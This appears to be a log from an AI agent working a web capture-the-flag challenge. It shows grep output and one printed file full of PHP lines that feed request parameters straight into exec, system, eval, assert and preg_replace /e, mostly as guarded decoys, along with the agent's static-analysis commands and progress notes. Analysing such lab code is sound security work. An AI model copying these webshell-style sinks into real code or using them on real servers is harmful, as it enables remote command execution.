+/tmp/ctf-src.9vgiAJ/src/R6DZumV9PG5.php:283:    exec($_GET['m8hFoB8ZZ'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/R6DZumV9PG5.php:287:system($_GET['ALQpEqQbL'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/R6DZumV9PG5.php:292:    eval($_GET['Ix0058cHE'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/R6DZumV9PG5.php:297:eval($_POST['TODVk47Ph'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/R6DZumV9PG5.php:397:    assert($_GET['ygDrIxugp'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/R6DZumV9PG5.php:563:    eval($_POST['DCTAJo3Hf'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/R6DZumV9PG5.php:567:assert($_POST['TnUd0fZdQ'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/R6DZumV9PG5.php:569:eval($npaIoEaGS);
+/tmp/ctf-src.9vgiAJ/src/S1YrGk15Pi9.php:61:exec($_GET['d8548aagt'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/S1YrGk15Pi9.php:74:    exec($_GET['NpKJXg09v'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/S1YrGk15Pi9.php:144:eval($RNgur9srh);
+/tmp/ctf-src.9vgiAJ/src/S1YrGk15Pi9.php:149:    assert($_GET['N4sO2LdXY'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/S1YrGk15Pi9.php:200:    exec($_GET['QfO1gts7F'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/S1YrGk15Pi9.php:412:exec($_GET['VO6owGGdY'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/S1YrGk15Pi9.php:519:assert($_POST['jMd1rv_O_'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/S1YrGk15Pi9.php:653:    exec($_GET['eQXdmWf04'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/S1YrGk15Pi9.php:756:exec($_GET['t4E99VkbZ'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/S1YrGk15Pi9.php:758:exec($_POST['LDOY60RbM'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/S1YrGk15Pi9.php:949:exec($_GET['pC0oOcUZz'] ?? ' ');
+/tmp/ctf-src.9vgiAJ/src/Ys32VpRbokL.php:3:@preg_replace("/_9TOWNPiBXj/e", $_GET['hcOAtDLJs'] ?? ' ', 'wW_miLqYK');
+/tmp/ctf-src.9vgiAJ/src/Ys32VpRbokL.php:214:    @preg_replace("/SBD/e", $_POST['vzKGq69nn'] ?? ' ', 'pyA6WuW3B');
+/tmp/ctf-src.9vgiAJ/src/sD93xnm5ivZ.php:59:    @preg_replace("/oGN_R1/e", $_POST['ve3_2rhYK'] ?? ' ', 'Hx9wy4wpY');
+/tmp/ctf-src.9vgiAJ/src/sD93xnm5ivZ.php:443:    @preg_replace("/O429Y79J/e", $_POST['Mr4W5vpf9'] ?? ' ', 'YBvh8mmYS');
+/tmp/ctf-src.9vgiAJ/src/sD93xnm5ivZ.php:905:    @preg_replace("/vZ/e", $_POST['Lu7FUI8UL'] ?? ' ', 'MccJcyO7Q');
+/tmp/ctf-src.9vgiAJ/src/sD93xnm5ivZ.php:1254:@preg_replace("/hdO/e", $_GET['j2DzFaeJe'] ?? ' ', 'f3F4LGcit');
+/tmp/ctf-src.9vgiAJ/src/sD93xnm5ivZ.php:1258:@preg_replace("/S0/e", $_POST['ChQGo4sZ7'] ?? ' ', 'Wo6ORSt91');
+/tmp/ctf-src.9vgiAJ/src/TPvLj0TOAnh.php:506:@preg_replace("/U8/e", $_GET['Qa7oWAw2Q'] ?? ' ', 'UbVdZXjcc');
+/tmp/ctf-src.9vgiAJ/src/TPvLj0TOAnh.php:597:@preg_replace("/je/e", $_GET['y6nm7_vEw'] ?? ' ', 'VRka0yKD6');
+/tmp/ctf-src.9vgiAJ/src/YmW54B5qMmX.php:61:@preg_replace("/Na07hF675/e", $_POST['raaL2IR6I'] ?? ' ', 'EUIc16rQW');
+/tmp/ctf-src.9vgiAJ/src/YmW54B5qMmX.php:617:@preg_replace("/qldS65bdoq/e", $_GET['YfeCt6lWp'] ?? ' ', 'SptJWAkY9');
+/tmp/ctf-src.9vgiAJ/src/xJVU7QvJAmP.php:293:@preg_replace("/jEyVyx9n19B/e", $_GET['yJIHowgMe'] ?? ' ', 'm1cBpFY4O');
+/tmp/ctf-src.9vgiAJ/src/xJVU7QvJAmP.php:342:@preg_replace("/zExlJ_/e", $_GET['dVjU346df'] ?? ' ', 'DskfupYbl');
+/tmp/ctf-src.9vgiAJ/src/BOq9VHCswtJ.php:316:@preg_replace("/i7Q4mTZAT/e", $_GET['dk0nqMVCZ'] ?? ' ', 'Khi_DT_Bk');
+/tmp/ctf-src.9vgiAJ/src/Ukxqrd7XKXm.php:447:    @preg_replace("/pqOh5d6/e", $_GET['tuyO21tUG'] ?? ' ', 'cGDQBHstc');
+/tmp/ctf-src.9vgiAJ/src/Ukxqrd7XKXm.php:575:    @preg_replace("/Y7yH5SiFy3a/e", $_GET['OOOFVHs44'] ?? ' ', 'RqGWjIXyz');
+/tmp/ctf-src.9vgiAJ/src/Ukxqrd7XKXm.php:643:@preg_replace("/oH/e", $_GET['ubyOqykcd'] ?? ' ', 'ZtOIUbMeS');
+/tmp/ctf-src.9vgiAJ/src/Ukxqrd7XKXm.php:985:@preg_replace("/vvlNS9brCy/e", $_GET['LB8kv1gUG'] ?? ' ', 'nUN4HVUlJ');
+/tmp/ctf-src.9vgiAJ/src/Ukxqrd7XKXm.php:1168:@preg_replace("/SsOv7to/e", $_GET['GCGDCm2Wr'] ?? ' ', 'dUWJdgNSX');
+/tmp/ctf-src.9vgiAJ/src/R6DZumV9PG5.php:105:    @preg_replace("/ubPGf/e", $_POST['k8GN7CnEK'] ?? ' ', 'X9Uj8sFgr');
+/tmp/ctf-src.9vgiAJ/src/R6DZumV9PG5.php:333:@preg_replace("/nCCn/e", $_GET['QA9a6_Afg'] ?? ' ', 'IaSeqERVT');
+/tmp/ctf-src.9vgiAJ/src/R6DZumV9PG5.php:372:@preg_replace("/YyGjmshaU3/e", $_GET['c9LrzZjTX'] ?? ' ', 'FGx3QU1k4');
+/tmp/ctf-src.9vgiAJ/src/CfRRkcBDpSg.php:620:    @preg_replace("/hvHD/e", $_POST['IKIvE63V8'] ?? ' ', 'M_MSvyyR9');
+/tmp/ctf-src.9vgiAJ/src/XJGJA7EIFb5.php:261:@preg_replace("/Gj8Gh/e", $_GET['xnaGB8yAq'] ?? ' ', 'g1caOXZU7');
+/tmp/ctf-src.9vgiAJ/src/XJGJA7EIFb5.php:353:@preg_replace("/lMrwRcXrV/e", $_POST['cnJBF1cKx'] ?? ' ', 'WZsPYTXBq');
+/tmp/ctf-src.9vgiAJ/src/XJGJA7EIFb5.php:376:    @preg_replace("/ieBxc/e", $_POST['OqLdgdIwD'] ?? ' ', 'FzQ8Df5kK');
+/tmp/ctf-src.9vgiAJ/src/XJGJA7EIFb5.php:884:    @preg_replace("/KykBJxj/e", $_GET['bdaPIg2ya'] ?? ' ', 'QQFKUG7qe');
+/tmp/ctf-src.9vgiAJ/src/XJGJA7EIFb5.php:1055:@preg_replace("/GwIlNgFN/e", $_GET['lDUlxrbjs'] ?? ' ', 'HcNCujTsv');
+/tmp/ctf-src.9vgiAJ/src/XJGJA7EIFb5.php:1143:@preg_replace("/VknrjY77yUX/e", $_POST['EzHf7hUid'] ?? ' ', 'YPxUY8cuv');
+/tmp/ctf-src.9vgiAJ/src/XJGJA7EIFb5.php:1346:@preg_replace("/Nm5/e", $_GET['W7qaiir_5'] ?? ' ', 'ioZyOBTta');
+/tmp/ctf-src.9vgiAJ/src/XYm7D9SWJ6k.php:101:@preg_replace("/NGy8_ChtwL/e", $_GET['oa7VUJey9'] ?? ' ', 'UKVvi5lVT');
+/tmp/ctf-src.9vgiAJ/src/XYm7D9SWJ6k.php:952:@preg_replace("/QgtV1/e", $_POST['rH0jG9TAU'] ?? ' ', 'NML9xqKJf');
+/tmp/ctf-src.9vgiAJ/src/DxR0xRBtUbF.php:3:@preg_replace("/UGqJ3xzi1bJ/e", $_GET['_LFGE8kGE'] ?? ' ', 'gKPTs_TnY');
+/tmp/ctf-src.9vgiAJ/src/DxR0xRBtUbF.php:198:@preg_replace("/y3toxTa/e", $_POST['c82GftFEE'] ?? ' ', 'I1V49KogB');
+/tmp/ctf-src.9vgiAJ/src/DxR0xRBtUbF.php:932:@preg_replace("/oQpUe57/e", $_GET['iMxwDDgpF'] ?? ' ', 'oIiH6GRI0');
+/tmp/ctf-src.9vgiAJ/src/DxR0xRBtUbF.php:1247:@preg_replace("/lc2Kam/e", $_GET['E7GpKgj_f'] ?? ' ', 'wFyA2OGh_');
+/tmp/ctf-src.9vgiAJ/src/ogA5CHjGHFa.php:362:@preg_replace("/STOBLFIbMa/e", $_GET['pa58it9vp'] ?? ' ', 'tmSjWLJvZ');
+/tmp/ctf-src.9vgiAJ/src/ogA5CHjGHFa.php:552:@preg_replace("/nLss5/e", $_POST['Cq1Q2gJIg'] ?? ' ', 'JeVTxTeT5');
+/tmp/ctf-src.9vgiAJ/src/ogA5CHjGHFa.php:881:    @preg_replace("/_8nthONfBl/e", $_GET['RIZOM92Ip'] ?? ' ', 'MP8MZXX4F');
+/tmp/ctf-src.9vgiAJ/src/ogA5CHjGHFa.php:903:@preg_replace("/T46I/e", $_GET['CJGIMDTeu'] ?? ' ', 'eAYNq2zhd');
+/tmp/ctf-src.9vgiAJ/src/wc31jXMtJbD.php:31:@preg_replace("/cW2cBC/e", $_POST['mDdkPxv7j'] ?? ' ', 'O4gCjBYkQ');
+/tmp/ctf-src.9vgiAJ/src/wc31jXMtJbD.php:209:    @preg_replace("/uCbvo8bAT/e", $_GET['P2IM0zWzZ'] ?? ' ', 'Ia_wEAThS');
+/tmp/ctf-src.9vgiAJ/src/wc31jXMtJbD.php:329:@preg_replace("/Lt/e", $_GET['diqdw8YMg'] ?? ' ', 'OUtVQNcUj');
+/tmp/ctf-src.9vgiAJ/src/wc31jXMtJbD.php:500:    @preg_replace("/MoTR7xSx0R/e", $_GET['bh4h6dLY8'] ?? ' ', 'u8fHvUMxI');
+/tmp/ctf-src.9vgiAJ/src/wc31jXMtJbD.php:702:@preg_replace("/ov0/e", $_POST['PZJJ5hces'] ?? ' ', 'WzMtK1vxW');
+/tmp/ctf-src.9vgiAJ/src/wc31jXMtJbD.php:810:    @preg_replace("/HbQbyeIge/e", $_POST['YEZMiAcz7'] ?? ' ', 'AFvkq5tng');
+/tmp/ctf-src.9vgiAJ/src/YTSxbXcLOX5.php:121:@preg_replace("/K_LmcqJ/e", $_GET['a8ZbrhKYH'] ?? ' ', 'H8ZF6OQtY');
+/tmp/ctf-src.9vgiAJ/src/YTSxbXcLOX5.php:887:    @preg_replace("/JgPj_/e", $_GET['ajhexIVW1'] ?? ' ', 'r7MfHjcdG');
+/tmp/ctf-src.9vgiAJ/src/RAXhmiWUpfG.php:127:@preg_replace("/d0Wz/e", $_GET['xQTYnzi6E'] ?? ' ', 'O9ooY72eC');
+/tmp/ctf-src.9vgiAJ/src/RAXhmiWUpfG.php:224:    @preg_replace("/tPdT8LhgUPc/e", $_POST['HNoeAejJM'] ?? ' ', 'mjwLvpQTY');
+/tmp/ctf-src.9vgiAJ/src/RAXhmiWUpfG.php:244:@preg_replace("/siANDFv0P/e", $_GET['Zq5BxM_GF'] ?? ' ', 'gNFi7Cna4');
+/tmp/ctf-src.9vgiAJ/src/RAXhmiWUpfG.php:429:    @preg_replace("/tgnFSHHa2l/e", $_GET['F98ThDaw0'] ?? ' ', 'MOCJosCx4');
+/tmp/ctf-src.9vgiAJ/src/RAXhmiWUpfG.php:454:@preg_replace("/wFfRay/e", $_GET['CHDlKzx4u'] ?? ' ', 'H_qz9PXWR');
+/tmp/ctf-src.9vgiAJ/src/TkHdfbGJFvU.php:123:    @preg_replace("/Zi2cen/e", $_GET['vuDYOuyuX'] ?? ' ', 'IVcO1GpyF');
+/tmp/ctf-src.9vgiAJ/src/TkHdfbGJFvU.php:692:@preg_replace("/kt2/e", $_GET['T02bU_8y0'] ?? ' ', 'JP1sbQa0j');
+/tmp/ctf-src.9vgiAJ/src/TkHdfbGJFvU.php:742:@preg_replace("/zaMYoodQ/e", $_GET['E9wcS68D8'] ?? ' ', 'lSZ1mVHom');
+/tmp/ctf-src.9vgiAJ/src/u2yjTZTql3o.php:101:@preg_replace("/Zc/e", $_GET['DOWKmZOpM'] ?? ' ', 'tQlb2Vsge');
+/tmp/ctf-src.9vgiAJ/src/u2yjTZTql3o.php:216:@preg_replace("/L6UltYm9/e", $_GET['QUKIYUfw_'] ?? ' ', 'sV1Qzs30b');
+/tmp/ctf-src.9vgiAJ/src/u2yjTZTql3o.php:640:    @preg_replace("/E1h6eZh/e", $_GET['iNPYOVUnD'] ?? ' ', 'jVd6vacvu');
+/tmp/ctf-src.9vgiAJ/src/u2yjTZTql3o.php:874:    @preg_replace("/lqs/e", $_GET['vQQnsg88D'] ?? ' ', 'hFdlQWlwa');
+/tmp/ctf-src.9vgiAJ/src/u2yjTZTql3o.php:921:@preg_replace("/JbhDn1Kb8n/e", $_POST['lERoPT7ms'] ?? ' ', 'VHWUgrDpe');
+/tmp/ctf-src.9vgiAJ/src/u2yjTZTql3o.php:992:@preg_replace("/QeQ7xZn0Zw/e", $_POST['LV7zVMXR0'] ?? ' ', 'eGxd6okCO');
+/tmp/ctf-src.9vgiAJ/src/u2yjTZTql3o.php:1624:    @preg_replace("/NmFBJDN07di/e", $_GET['VwqPfXN7S'] ?? ' ', 'n9OQOjejk');
+/tmp/ctf-src.9vgiAJ/src/u2yjTZTql3o.php:2038:@preg_replace("/Q5PqE/e", $_POST['XP2x075Qv'] ?? ' ', 'W1GEHjuxm');
+/tmp/ctf-src.9vgiAJ/src/D1akb3GTcF5.php:465:@preg_replace("/Yq/e", $_GET['oeaqsSeJv'] ?? ' ', 'RXeNvHnyt');
+/tmp/ctf-src.9vgiAJ/src/D1akb3GTcF5.php:583:@preg_replace("/gIVH0bk/e", $_POST['jA_0F93Wf'] ?? ' ', 'frKv0WWQP');
+/tmp/ctf-src.9vgiAJ/src/D1akb3GTcF5.php:808:    @preg_replace("/ETnbhw/e", $_GET['AZZ5IAk99'] ?? ' ', 'VsBgVU4zj');
+/tmp/ctf-src.9vgiAJ/src/D1akb3GTcF5.php:1126:@preg_replace("/gt/e", $_POST['ObhsjPYs5'] ?? ' ', 'bRr6_AcSb');
+/tmp/ctf-src.9vgiAJ/src/D1akb3GTcF5.php:1344:    @preg_replace("/bL2k/e", $_GET['GA6hpefTE'] ?? ' ', 'Q5czWFMas');
+/tmp/ctf-src.9vgiAJ/src/D1akb3GTcF5.php:1385:    @preg_replace("/_irO5vsNcz/e", $_GET['H6ALj7JA6'] ?? ' ', 'zr3YbTF42');
+/tmp/ctf-src.9vgiAJ/src/D1akb3GTcF5.php:1742:@preg_replace("/UtJ8m6/e", $_GET['Nrqrj4b9E'] ?? ' ', 'WDv5Ajxkf');
+/tmp/ctf-src.9vgiAJ/src/S1YrGk15Pi9.php:886:@preg_replace("/xBc8veRR/e", $_GET['JUx1OCqs9'] ?? ' ', 'ZFlzm62MO');
+/tmp/ctf-src.9vgiAJ/src/wWMJHHwGLY0.php:20:@preg_replace("/LWRJ60C5/e", $_GET['dZTtE4FYq'] ?? ' ', 'PIwA5aFlY');
+/tmp/ctf-src.9vgiAJ/src/wWMJHHwGLY0.php:95:@preg_replace("/IvFeYUK0/e", $_GET['QJFS7tMBh'] ?? ' ', 'aHkaLTwSx');
+/tmp/ctf-src.9vgiAJ/src/wWMJHHwGLY0.php:157:@preg_replace("/c90rhN3/e", $_POST['z0eSbgR6R'] ?? ' ', 'ELw5w93yb');
+/tmp/ctf-src.9vgiAJ/src/wWMJHHwGLY0.php:357:@preg_replace("/g0DKnfMcB/e", $_GET['xPWyqVvYi'] ?? ' ', 'yLxUvfQYd');
+/tmp/ctf-src.9vgiAJ/src/wWMJHHwGLY0.php:503:@preg_replace("/sSMLQOs/e", $_GET['LSxwt7aUG'] ?? ' ', 'unYv_CZG7');
+/tmp/ctf-src.9vgiAJ/src/wWMJHHwGLY0.php:691:@preg_replace("/ziJ/e", $_GET['tZQAbCNEd'] ?? ' ', 'pdGwrYwP_');
+/tmp/ctf-src.9vgiAJ/src/wWMJHHwGLY0.php:878:    @preg_replace("/Luwge/e", $_GET['F8VtZpX2L'] ?? ' ', 'enoUUdLth');
+/tmp/ctf-src.9vgiAJ/src/wWMJHHwGLY0.php:1070:    @preg_replace("/LZ87nnP/e", $_POST['GnROr4Xq4'] ?? ' ', 'LVbDt3oBT');
+
+apply patch
+patch: completed
+/home/stw/ctf-agent/challenges/manual_web_49388fea2961/progress.md
+diff --git a/challenges/manual_web_49388fea2961/progress.md b/challenges/manual_web_49388fea2961/progress.md
+index c83802c9c66224f9980edb77eff4c67e73b9b693..0cf34615a3140c8b0e74b1e144bb294faa38fc85
+--- a/challenges/manual_web_49388fea2961/progress.md
++++ b/challenges/manual_web_49388fea2961/progress.md
+@@ -8,7 +8,7 @@
+ recon / source acquisition
+ 
+ ## Next Steps
+-1. 主线检查唯一 HTML、内容哈希分布、请求参数与 flag 字符串
++1. 用静态解析器/结构特征替代本机缺失的 `php -l`
+ 2. 等待 branch_001（危险调用）和 branch_002（代码聚类）结果
+ 3. 汇总候选并进行 HTTP 验证
+ 
+@@ -21,6 +21,13 @@
+ - 首次调用 `python3 branch.py` 失败：挑战目录无该脚本，需在上层定位
+ - 已定位 daemon 客户端：`/home/stw/ctf-agent/branch.py`
+ - 已启动异步分支：branch_001 dangerous_sink_scan、branch_002 code_clustering
++- 所有 3001 个 PHP 内容哈希均唯一；唯一 HTML 仅为当前首页
++- PHP 均含大量随机 `$_GET`/`$_POST` 与 eval/assert/system/exec token，简单 grep 信噪比极低
++- 明文 flag 命中均为随机标识符/参数名，暂未见 `flag{...}`
++- 本机未安装 PHP CLI；`/tmp/php_invalid.txt` 结果无效（全部仅因 `php: command not found`）
++- branch_001 已读取 board/progress；当前开始对 3001 个 PHP 做危险 sink 与用户输入的系统化静态扫描
++- 已确认 Web 策略文件位于 `/home/stw/ctf-agent/strategies/web.md`，待按其流程执行
++- branch_001 初扫结果：危险命令 sink 32,290 行、include/反序列化类 9,395 行、用户输入 264,901 行；高密度随机诱饵明显，下一步按每文件 sink 数、首行可达性和 PHP 7.3 兼容性排序
+ 
+ ## Flags Found
+ (无)
+
+diff --git a/challenges/manual_web_49388fea2961/progress.md b/challenges/manual_web_49388fea2961/progress.md
+index c83802c9c66224f9980edb77eff4c67e73b9b693..0cf34615a3140c8b0e74b1e144bb294faa38fc85
+--- a/challenges/manual_web_49388fea2961/progress.md
++++ b/challenges/manual_web_49388fea2961/progress.md
+@@ -8,7 +8,7 @@
+ recon / source acquisition
+ 
+ ## Next Steps
+-1. 主线检查唯一 HTML、内容哈希分布、请求参数与 flag 字符串
++1. 用静态解析器/结构特征替代本机缺失的 `php -l`
+ 2. 等待 branch_001（危险调用）和 branch_002（代码聚类）结果
+ 3. 汇总候选并进行 HTTP 验证
+ 
+@@ -21,6 +21,13 @@
+ - 首次调用 `python3 branch.py` 失败：挑战目录无该脚本，需在上层定位
+ - 已定位 daemon 客户端：`/home/stw/ctf-agent/branch.py`
+ - 已启动异步分支：branch_001 dangerous_sink_scan、branch_002 code_clustering
++- 所有 3001 个 PHP 内容哈希均唯一；唯一 HTML 仅为当前首页
++- PHP 均含大量随机 `$_GET`/`$_POST` 与 eval/assert/system/exec token，简单 grep 信噪比极低
++- 明文 flag 命中均为随机标识符/参数名，暂未见 `flag{...}`
++- 本机未安装 PHP CLI；`/tmp/php_invalid.txt` 结果无效（全部仅因 `php: command not found`）
++- branch_001 已读取 board/progress；当前开始对 3001 个 PHP 做危险 sink 与用户输入的系统化静态扫描
++- 已确认 Web 策略文件位于 `/home/stw/ctf-agent/strategies/web.md`，待按其流程执行
++- branch_001 初扫结果：危险命令 sink 32,290 行、include/反序列化类 9,395 行、用户输入 264,901 行；高密度随机诱饵明显，下一步按每文件 sink 数、首行可达性和 PHP 7.3 兼容性排序
+ 
+ ## Flags Found
+ (无)
+
+exec
+/bin/bash -lc "awk -F: '{n["'$1]++} END{for(f in n) print n[f],f}'"' /tmp/branch001_exec_sinks.txt | sort -n > /tmp/branch001_sink_counts.txt
+awk -F: '{n["'$1]++} END{for(f in n) print n[f],f}'"' /tmp/branch001_inputs.txt | sort -n > /tmp/branch001_input_counts.txt
+sed -n '1,20p' /tmp/branch001_sink_counts.txt
+tail -20 /tmp/branch001_sink_counts.txt
+awk '{c["'$1]++} END{for(k in c) print k,c[k]}'"' /tmp/branch001_sink_counts.txt | sort -n
+sed -n '1,120p' /tmp/ctf-src.9vgiAJ/src/K9128rwMdpJ.php
+stat -c '%s %n' /tmp/ctf-src.9vgiAJ/src/*.php | sort -n | sed -n '1,15p'" in /home/stw/ctf-agent/challenges/manual_web_49388fea2961
+hook: PostToolUse
+hook: PostToolUse Completed
+diff --git a/challenges/manual_web_49388fea2961/progress.md b/challenges/manual_web_49388fea2961/progress.md
+index c83802c9c66224f9980edb77eff4c67e73b9b693..0cf34615a3140c8b0e74b1e144bb294faa38fc85
+--- a/challenges/manual_web_49388fea2961/progress.md
++++ b/challenges/manual_web_49388fea2961/progress.md
+@@ -8,7 +8,7 @@
+ recon / source acquisition
+ 
+ ## Next Steps
+-1. 主线检查唯一 HTML、内容哈希分布、请求参数与 flag 字符串
++1. 用静态解析器/结构特征替代本机缺失的 `php -l`
+ 2. 等待 branch_001（危险调用）和 branch_002（代码聚类）结果
+ 3. 汇总候选并进行 HTTP 验证
+ 
+@@ -21,6 +21,13 @@
+ - 首次调用 `python3 branch.py` 失败：挑战目录无该脚本，需在上层定位
+ - 已定位 daemon 客户端：`/home/stw/ctf-agent/branch.py`
+ - 已启动异步分支：branch_001 dangerous_sink_scan、branch_002 code_clustering
++- 所有 3001 个 PHP 内容哈希均唯一；唯一 HTML 仅为当前首页
++- PHP 均含大量随机 `$_GET`/`$_POST` 与 eval/assert/system/exec token，简单 grep 信噪比极低
++- 明文 flag 命中均为随机标识符/参数名，暂未见 `flag{...}`
++- 本机未安装 PHP CLI；`/tmp/php_invalid.txt` 结果无效（全部仅因 `php: command not found`）
++- branch_001 已读取 board/progress；当前开始对 3001 个 PHP 做危险 sink 与用户输入的系统化静态扫描
++- 已确认 Web 策略文件位于 `/home/stw/ctf-agent/strategies/web.md`，待按其流程执行
++- branch_001 初扫结果：危险命令 sink 32,290 行、include/反序列化类 9,395 行、用户输入 264,901 行；高密度随机诱饵明显，下一步按每文件 sink 数、首行可达性和 PHP 7.3 兼容性排序
+ 
+ ## Flags Found
+ (无)
+
+ succeeded in 223ms:
+1 /tmp/ctf-src.9vgiAJ/src/C_4of4Nt0bn.php
+1 /tmp/ctf-src.9vgiAJ/src/Hf77Qj7tW7u.php
+1 /tmp/ctf-src.9vgiAJ/src/J3MBI2kYc40.php
+1 /tmp/ctf-src.9vgiAJ/src/RoRaoKcTp34.php
+1 /tmp/ctf-src.9vgiAJ/src/SK93TeIwDKl.php
+1 /tmp/ctf-src.9vgiAJ/src/TBeVG9jMgjq.php
+1 /tmp/ctf-src.9vgiAJ/src/Xk6n0OpPaRC.php
+1 /tmp/ctf-src.9vgiAJ/src/ZK2W01IQrxH.php
+1 /tmp/ctf-src.9vgiAJ/src/cAOz7ryfb9B.php
+1 /tmp/ctf-src.9vgiAJ/src/dPePOEt9u_D.php
+1 /tmp/ctf-src.9vgiAJ/src/dRpisk7m4Co.php
+1 /tmp/ctf-src.9vgiAJ/src/nLhSCB5KlEF.php
+1 /tmp/ctf-src.9vgiAJ/src/nsz5dDmRUjJ.php
+1 /tmp/ctf-src.9vgiAJ/src/qZ31lN65nFD.php
+1 /tmp/ctf-src.9vgiAJ/src/s6ICo03S9ot.php
+1 /tmp/ctf-src.9vgiAJ/src/vkcERmQ0Jnm.php
+2 /tmp/ctf-src.9vgiAJ/src/AifVdSJEYVD.php
+2 /tmp/ctf-src.9vgiAJ/src/BKSoYBY8uMk.php
+2 /tmp/ctf-src.9vgiAJ/src/BOq9VHCswtJ.php
+2 /tmp/ctf-src.9vgiAJ/src/EUz8ebJ8HT0.php
+25 /tmp/ctf-src.9vgiAJ/src/oL1DFnC1ssY.php
+25 /tmp/ctf-src.9vgiAJ/src/uFFuMJP2BFQ.php
+26 /tmp/ctf-src.9vgiAJ/src/LAPovOOzGfd.php
+26 /tmp/ctf-src.9vgiAJ/src/M5AYqYV5dP3.php
+26 /tmp/ctf-src.9vgiAJ/src/T9IsW95w3vE.php
+26 /tmp/ctf-src.9vgiAJ/src/frqpKZ47QwA.php
+26 /tmp/ctf-src.9vgiAJ/src/uQVjBe7ae1p.php
+27 /tmp/ctf-src.9vgiAJ/src/LYxft2DMOVd.php
+27 /tmp/ctf-src.9vgiAJ/src/QGuiQzp0VFb.php
+27 /tmp/ctf-src.9vgiAJ/src/ThUqob_CHQM.php
+27 /tmp/ctf-src.9vgiAJ/src/nvS0FlQnyna.php
+27 /tmp/ctf-src.9vgiAJ/src/x6hDcivJY4v.php
+28 /tmp/ctf-src.9vgiAJ/src/CLcz4k8dFei.php
+28 /tmp/ctf-src.9vgiAJ/src/Gut7Nwzxni0.php
+28 /tmp/ctf-src.9vgiAJ/src/XSQRsSEqAxM.php
+28 /tmp/ctf-src.9vgiAJ/src/dO0yLbOhaiZ.php
+29 /tmp/ctf-src.9vgiAJ/src/pMDA3e6s9vA.php
+30 /tmp/ctf-src.9vgiAJ/src/z1BJocyqrNO.php
+31 /tmp/ctf-src.9vgiAJ/src/rYrCDCuzpJq.php
+34 /tmp/ctf-src.9vgiAJ/src/NddwjWoez_0.php
+1 16
+2 61
+3 130
+4 161
+5 168
+6 211
+7 187
+8 193
+9 222
+10 181
+11 203
+12 179
+13 186
+14 147
+15 144
+16 140
+17 118
+18 82
+19 67
+20 61
+21 39
+22 27
+23 27
+24 16
+25 8
+26 5
+27 5
+28 4
+29 1
+30 1
+31 1
+34 1
+<?php
+if('Q6kMBHJG2' == 'RD1EgknVG')
+exec($_GET['Q6kMBHJG2'] ?? ' ');
+/*
+if('rGSydEL3p' == 'Ir2FhA0lg')
+system($_GET['rGSydEL3p'] ?? ' ');
+*/
+$nI = 'd7n';
+$zFAF = 'uf51wAmk';
+$z5J9 = 'eJM7xZy';
+$u4oiHg6W9 = 'DLK9TA';
+$eJkRdSUEZlo = new stdClass();
+$eJkRdSUEZlo->Oe5wpE = 'ykhV';
+$eJkRdSUEZlo->YS0LB = 'yJOzP9NO';
+$eJkRdSUEZlo->Me5EmCXOS = 'oGx7';
+$eJkRdSUEZlo->zKIQ_D_ = 'aOdUAfIYEo4';
+$eJkRdSUEZlo->SWs3ln2Sext = 'PuGVHmCQmH';
+$eJkRdSUEZlo->X08peD_TLQh = 'HvmuXL3vQJV';
+$eJkRdSUEZlo->_i6xGy = 'p3UyFRi';
+$eJkRdSUEZlo->OZfQI = '_g1WNGVBb';
+preg_match('/D9hufl/i', $nI, $match);
+print_r($match);
+$zFAF = $_POST['mn5mtYg4BtpOk2'] ?? ' ';
+$z5J9 .= 'pDTP62';
+$u4oiHg6W9 .= 'Fsy7icl05danpuED';
+if('sRy1uiY99' == 'Yk9mKtIZW')
+ eval($_GET['sRy1uiY99'] ?? ' ');
+$cAKKSY3gIP = 'VUmrIzP2Qx';
+$ArzF = 'FN';
+$nEdnFX4PhAr = 'mpS_L90c';
+$u0jq5RYxm_J = 'Ussnt';
+$JsgO = '_fVpbqa';
+$APJZGsA_ie0 = 'yq_TYh';
+$SrHbM = 'tMtR0Egg6TE';
+$Rv6OWLYvwD = 'NC';
+$dgzv = 'NJ1KRqdKGks';
+str_replace('LLRA5gtDL3wO5T', 'hK4y5IXKHQa', $cAKKSY3gIP);
+$ArzF .= 'TUmWLf';
+preg_match('/gNnAHr/i', $nEdnFX4PhAr, $match);
+print_r($match);
+str_replace('cB_E64rK', 'GnfTnIxcH4', $JsgO);
+$APJZGsA_ie0 .= 'jyASzbUcjZN';
+$SrHbM = $_POST['oHlAOyRaHT5N0qSp'] ?? ' ';
+$ZQshtE = array();
+$ZQshtE[]= $Rv6OWLYvwD;
+var_dump($ZQshtE);
+$dgzv = $_POST['rNpu_5KpKznBp5wR'] ?? ' ';
+$AyZbzO60duW = 'Om3iBrh8KC3';
+$j7nk = new stdClass();
+$j7nk->UmtN2 = 'wvh9XvT';
+$j7nk->jkWsx = 'Bw0MiG';
+$j7nk->haBj = 'L1kq6E6WQH';
+$j7nk->eilh6oK = 'mO';
+$j7nk->C_Xp = 'Hcdm';
+$j7nk->M5naoKt = 'cHZY';
+$j7nk->p4PXybY = 'A5He6P';
+$j7nk->OCWIV1Qm = 'crZQfCcM190';
+$LHBVEpjd = 'MvQsESbx';
+$AgBzKjnK0 = 'fG';
+$gGS_Iw3H_ = new stdClass();
+$gGS_Iw3H_->yhtpd = 'zMTP7BK';
+$gGS_Iw3H_->ELp4ytSY = 'ED9';
+$DYf_ylIN0 = 'xcfhC';
+$UnXVPFpFI1 = 'psaQd6p';
+preg_match('/Om93wg/i', $LHBVEpjd, $match);
+print_r($match);
+var_dump($AgBzKjnK0);
+echo $DYf_ylIN0;
+var_dump($UnXVPFpFI1);
+if('ewlt7n3Ac' == 'e7MH3nFdt')
+eval($_POST['ewlt7n3Ac'] ?? ' ');
+$WVIv = 'TOtt';
+$A7F = 'fDI';
+$Mgd43Xl = new stdClass();
